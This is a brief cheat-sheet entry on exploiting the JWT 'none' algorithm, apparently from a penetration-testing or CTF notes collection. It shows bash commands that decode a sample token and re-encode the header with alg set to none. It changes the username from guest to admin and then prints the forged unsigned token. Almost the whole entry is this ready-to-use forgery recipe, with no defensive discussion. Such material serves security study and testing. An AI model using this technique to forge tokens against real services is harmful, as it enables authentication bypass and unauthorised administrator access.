# JWT

## JWT None algorithm exploitation

```bash
# Decode JWT Header and Payload
echo -n "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9" | base64 -d
echo -n "eyJ1c2VybmFtZSI6Imd1ZXN0IiwiZXhwIjoxNzEwNDIwMzgzfQ" | base64 -d

# Change header alg to none
echo -n '{"typ":"JWT","alg":"none"}' | base64

# Change payload username
echo -n '{"username":"admin","exp":1710420383}' | base64

# Join header and payload with dots (remove signature)
eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0=.eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNzEwNDIwMzgzfQ==.
```

[JWT Decode](https://jwt.io)